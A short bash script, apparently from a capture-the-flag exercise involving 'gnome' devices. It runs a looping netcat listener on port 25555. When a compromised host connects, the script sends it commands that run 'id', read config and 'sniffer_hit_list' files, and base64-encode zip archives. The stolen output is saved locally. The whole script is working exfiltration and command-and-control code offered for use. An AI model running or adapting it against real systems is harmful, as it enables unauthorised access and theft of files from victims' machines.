#!/bin/bash
#vars
port=25555
gs_path="/gnome/www/files"
dir_path="./data/"

send_command="id; echo gnome.conf; cat ${gs_path}/gnome.conf; echo gnome_firmware_rel_notes.txt ; cat ${gs_path}/gnome_firmware_rel_notes.txt; \
echo sniffer_hit_list.txt; cat ${gs_path}/sniffer_hit_list.txt ; echo 20151215161015.zip ; openssl base64 -in ${gs_path}/20151215161015.zip; \
echo factory_cam_5.zip; openssl base64 -in ${gs_path}/factory_cam_5.zip ; echo sgnet.zip; openssl base64 -in ${gs_path}/sgnet.zip"

while true
do

DEST_FILE=`tempfile | cut -d\/ -f3` 

echo "${send_command}" | nc -l -p ${port} -vvv > "${dir_path}/${DEST_FILE}"

done

